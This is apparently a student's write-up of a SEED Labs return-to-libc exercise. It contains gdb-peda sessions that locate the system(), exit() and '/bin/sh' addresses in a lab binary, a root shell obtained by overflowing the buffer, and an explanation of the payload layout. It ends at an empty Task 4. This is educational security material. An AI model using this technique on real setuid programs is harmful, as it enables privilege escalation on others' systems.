# Answer in my observation

* In this lab, I will use different size of buffer instead of 12-byte default.
```console
    [03/22/24]seed@VM:~/.../Labsetup$ gcc -m32 -DBUF_SIZE=20 -fno-stack-protector -z noexecstack -o retlib retlib.c
    [03/22/24]seed@VM:~/.../Labsetup$ sudo chown root retlib
    [03/22/24]seed@VM:~/.../Labsetup$ sudo chmod 4755 retlib
```

## Task 1
- Running the program.
- Finding address of `system()` and `exit()` function in library.

```console
    [03/22/24]seed@VM:~/.../Labsetup$ gdb retlib 
    GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
    Copyright (C) 2020 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.
    Type "show copying" and "show warranty" for details.
    This GDB was configured as "x86_64-linux-gnu".
    Type "show configuration" for configuration details.
    For bug reporting instructions, please see:
    <http://www.gnu.org/software/gdb/bugs/>.
    Find the GDB manual and other documentation resources online at:
        <http://www.gnu.org/software/gdb/documentation/>.

    For help, type "help".
    Type "apropos word" to search for commands related to "word"...
    /opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
    if sys.version_info.major is 3:
    /opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
    if pyversion is 3:
    Reading symbols from retlib...
    (No debugging symbols found in retlib)
    gdb-peda$ run
    Starting program: /home/seed/ret_to_libc/Labsetup/retlib 
    Address of input[] inside main():  0xffffd120
    Input size: 0
    Address of buffer[] inside bof():  0xffffcddc
    Frame Pointer value inside bof():  0xffffd108
    (^_^)(^_^) Returned Properly (^_^)(^_^)
    [Inferior 1 (process 3317) exited with code 01]
    Warning: not running
    gdb-peda$ p system
    $1 = {<text variable, no debug info>} 0xf7e12420 <system>
    gdb-peda$ p exit
    $2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
    gdb-peda$ quit
```

## Task 2
- To find the address of `/bin/sh`:
+ Using `gdb-peda`:
```
    gdb-peda$ vmmap
    Warning: not running
    Start      End        Perm      Name
    0x56556000 0x56556454 rx-p      /home/seed/ret_to_libc/Labsetup/retlib
    0x565551b4 0x565572d8 r--p      /home/seed/ret_to_libc/Labsetup/retlib
    0x56558ec8 0x56559010 rw-p      /home/seed/ret_to_libc/Labsetup/retlib
    gdb-peda$ break main
    Breakpoint 1 at 0x565562f8
    gdb-peda$ run
    Starting program: /home/seed/ret_to_libc/Labsetup/retlib 
    [----------------------------------registers-----------------------------------]
    EAX: 0xf7fb6808 --> 0xffffd5cc --> 0xffffd734 ("SHELL=/bin/bash")
    EBX: 0x0 
    ECX: 0x635fc72d 
    EDX: 0xffffd554 --> 0x0 
    ESI: 0xf7fb4000 --> 0x1e6d6c 
    EDI: 0xf7fb4000 --> 0x1e6d6c 
    EBP: 0x0 
    ESP: 0xffffd52c --> 0xf7debee5 (<__libc_start_main+245>:        add    esp,0x10)
    EIP: 0x565562f8 (<main>:        endbr32)
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    0x565562f3 <foo+58>: mov    ebx,DWORD PTR [ebp-0x4]
    0x565562f6 <foo+61>: leave  
    0x565562f7 <foo+62>: ret    
    => 0x565562f8 <main>:   endbr32 
    0x565562fc <main+4>: lea    ecx,[esp+0x4]
    0x56556300 <main+8>: and    esp,0xfffffff0
    0x56556303 <main+11>:        push   DWORD PTR [ecx-0x4]
    0x56556306 <main+14>:        push   ebp
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd52c --> 0xf7debee5 (<__libc_start_main+245>:       add    esp,0x10)
    0004| 0xffffd530 --> 0x1 
    0008| 0xffffd534 --> 0xffffd5c4 --> 0xffffd70d ("/home/seed/ret_to_libc/Labsetup/retlib")
    0012| 0xffffd538 --> 0xffffd5cc --> 0xffffd734 ("SHELL=/bin/bash")
    0016| 0xffffd53c --> 0xffffd554 --> 0x0 
    0020| 0xffffd540 --> 0xf7fb4000 --> 0x1e6d6c 
    0024| 0xffffd544 --> 0xf7ffd000 --> 0x2bf24 
    0028| 0xffffd548 --> 0xffffd5a8 --> 0xffffd5c4 --> 0xffffd70d ("/home/seed/ret_to_libc/Labsetup/retlib")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value

    Breakpoint 1, 0x565562f8 in main ()
    gdb-peda$ vmmap
    Start      End        Perm      Name
    0x56555000 0x56556000 r--p      /home/seed/ret_to_libc/Labsetup/retlib
    0x56556000 0x56557000 r-xp      /home/seed/ret_to_libc/Labsetup/retlib
    0x56557000 0x56558000 r--p      /home/seed/ret_to_libc/Labsetup/retlib
    0x56558000 0x56559000 r--p      /home/seed/ret_to_libc/Labsetup/retlib
    0x56559000 0x5655a000 rw-p      /home/seed/ret_to_libc/Labsetup/retlib
    0xf7dcd000 0xf7dea000 r--p      /usr/lib32/libc-2.31.so
    0xf7dea000 0xf7f42000 r-xp      /usr/lib32/libc-2.31.so
    0xf7f42000 0xf7fb2000 r--p      /usr/lib32/libc-2.31.so
    0xf7fb2000 0xf7fb4000 r--p      /usr/lib32/libc-2.31.so
    0xf7fb4000 0xf7fb6000 rw-p      /usr/lib32/libc-2.31.so
    0xf7fb6000 0xf7fb8000 rw-p      mapped
    0xf7fcb000 0xf7fcd000 rw-p      mapped
    0xf7fcd000 0xf7fd0000 r--p      [vvar]
    0xf7fd0000 0xf7fd1000 r-xp      [vdso]
    0xf7fd1000 0xf7fd2000 r--p      /usr/lib32/ld-2.31.so
    0xf7fd2000 0xf7ff0000 r-xp      /usr/lib32/ld-2.31.so
    0xf7ff0000 0xf7ffb000 r--p      /usr/lib32/ld-2.31.so
    0xf7ffc000 0xf7ffd000 r--p      /usr/lib32/ld-2.31.so
    0xf7ffd000 0xf7ffe000 rw-p      /usr/lib32/ld-2.31.so
    0xfffdd000 0xffffe000 rw-p      [stack]
    gdb-peda$ find "/bin/sh"
    Searching for '/bin/sh' in: None ranges
    Found 2 results, display max 2 items:
    libc : 0xf7f5c352 ("/bin/sh")
    [stack] : 0xffffd73c ("/bin/sh")

```

+ Finding libc version using `info proc map` command in `gdb-peda` and `strings` command to find address of `/bin/sh`.

```
    gdb-peda$ info proc map
    process 4043
    Mapped address spaces:

            Start Addr   End Addr       Size     Offset objfile
            0x56555000 0x56556000     0x1000        0x0 /home/seed/ret_to_libc/Labsetup/retlib
            0x56556000 0x56557000     0x1000     0x1000 /home/seed/ret_to_libc/Labsetup/retlib
            0x56557000 0x56558000     0x1000     0x2000 /home/seed/ret_to_libc/Labsetup/retlib
            0x56558000 0x56559000     0x1000     0x2000 /home/seed/ret_to_libc/Labsetup/retlib
            0x56559000 0x5655a000     0x1000     0x3000 /home/seed/ret_to_libc/Labsetup/retlib
            0xf7dcd000 0xf7dea000    0x1d000        0x0 /usr/lib32/libc-2.31.so
            0xf7dea000 0xf7f42000   0x158000    0x1d000 /usr/lib32/libc-2.31.so
            0xf7f42000 0xf7fb2000    0x70000   0x175000 /usr/lib32/libc-2.31.so
            0xf7fb2000 0xf7fb4000     0x2000   0x1e4000 /usr/lib32/libc-2.31.so
            0xf7fb4000 0xf7fb6000     0x2000   0x1e6000 /usr/lib32/libc-2.31.so
            0xf7fb6000 0xf7fb8000     0x2000        0x0 
            0xf7fcb000 0xf7fcd000     0x2000        0x0 
            0xf7fcd000 0xf7fd0000     0x3000        0x0 [vvar]
            0xf7fd0000 0xf7fd1000     0x1000        0x0 [vdso]
            0xf7fd1000 0xf7fd2000     0x1000        0x0 /usr/lib32/ld-2.31.so
            0xf7fd2000 0xf7ff0000    0x1e000     0x1000 /usr/lib32/ld-2.31.so
            0xf7ff0000 0xf7ffb000     0xb000    0x1f000 /usr/lib32/ld-2.31.so
            0xf7ffc000 0xf7ffd000     0x1000    0x2a000 /usr/lib32/ld-2.31.so
            0xf7ffd000 0xf7ffe000     0x1000    0x2b000 /usr/lib32/ld-2.31.so
            0xfffdd000 0xffffe000    0x21000        0x0 [stack]
    gdb-peda$ strings -a -t x /usr/lib32/libc-2.31.so | grep "/bin/sh"
    Warning: failed to get memory map for -a
    gdb-peda$ quit
    [03/22/24]seed@VM:~/.../Labsetup$ strings -a -t x /usr/lib32/libc-2.31.so | grep "/bin/sh"
    18f352 /bin/sh
```
&rarr; We can see that the first address of libc `/usr/lib32/libc-2.31.so` is 0xf7dcd000 and the address of `/bin/sh` is 18f352. Adding together we will have address of `/bin/sh` is 0xf7f5c352.

## Task 3
- After having address of `/bin/sh`, `system()` and `exit()`, we will succesffuly attack.
```
    [03/22/24]seed@VM:~/.../Labsetup$ ./retlib 
    Address of input[] inside main():  0xffffd170
    Input size: 48
    Address of buffer[] inside bof():  0xffffd138
    Frame Pointer value inside bof():  0xffffd158
    # id
    uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
    # whoami
    root
    # 
```

- Explanation:
+ First we will check the stack's structure when the program call `bof()` function, using `disassemble <function's name>` command, we can see that the buffer overflow is from line that has `strcpy()`.
+ We will see the distance between `$ebp` and `buffer` variable is 0x20, which is 32 bytes.
+ To attack the program successfully, we will need: 32 bytes `buffer` + 4 bytes padding + 4 bytes `system()`(Y) + 4 bytes `exit()`(Z) + 4 bytes `/bin/sh`(X).
+ The `exit()` function is used as a return address of `system()` function, its address can be replaced with other value but it will send errror `Segmentation fault` when `exit` the shell. If we only use address of `/bin/sh` for `system()`, the attack will not be successful.
+ If we only change the file name of `retlib` to `newretlib`, the attack is still successful because the stack structure is not change.

## Task 4
